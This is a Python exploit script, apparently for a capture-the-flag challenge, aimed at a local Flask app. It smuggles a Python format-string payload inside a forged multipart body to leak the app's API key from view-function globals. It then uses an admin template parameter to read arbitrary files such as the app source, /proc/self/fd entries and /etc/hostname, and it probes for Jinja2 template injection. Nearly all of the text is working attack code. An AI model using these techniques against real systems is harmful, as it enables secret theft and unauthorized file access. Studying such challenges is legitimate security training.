import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

def ssti_via_proc_self_fd(api_key, jinja_payload):
    """
    通过 /proc/self/fd/X 来触发 SSTI
    当 httpx 发送请求时，请求体可能存在于某个 fd 中
    """
    headers = {"Authorization": api_key}
    
    # 先建立一个包含 Jinja2 payload 的连接
    # 尝试读取 /proc/self/fd/X
    for fd in range(3, 20):
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": f"/proc/self/fd/{fd}"}, headers=headers, timeout=5.0)
        if r.status_code == 200 and r.text:
            print(f"fd/{fd}: {r.text[:100]}")

def write_file_and_ssti(api_key, payload):
    """
    尝试通过写入 /tmp 文件然后读取来触发 SSTI
    但这需要写权限...
    """
    pass

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 方法1: 检查是否可以通过某些特殊文件注入 SSTI
    print("\n[*] Checking /proc/self/fd/...")
    ssti_via_proc_self_fd(api_key, "{{ 7*7 }}")
    
    # 方法2: 尝试读取 /proc/self/cwd 下的文件
    print("\n[*] Checking app directory...")
    content, code = read_file_via_admin(api_key, "/app/app.py")
    if code == 200:
        print(f"[+] /app/app.py exists")
        # 检查是否有其他文件
    
    # 方法3: 使用 /proc/self/root 符号链接
    print("\n[*] Checking /proc/self/root/...")
    content, code = read_file_via_admin(api_key, "/proc/self/root/etc/hostname")
    print(f"Status: {code}, Content: {content[:100] if content else 'Empty'}")
    
    # 方法4: 利用 index.html 中可能存在的 SSTI - 先读取看看模板内容
    print("\n[*] Reading index.html template...")
    content, code = read_file_via_admin(api_key, "/app/templates/index.html")
    if code == 200:
        print(f"index.html content:\n{content}")
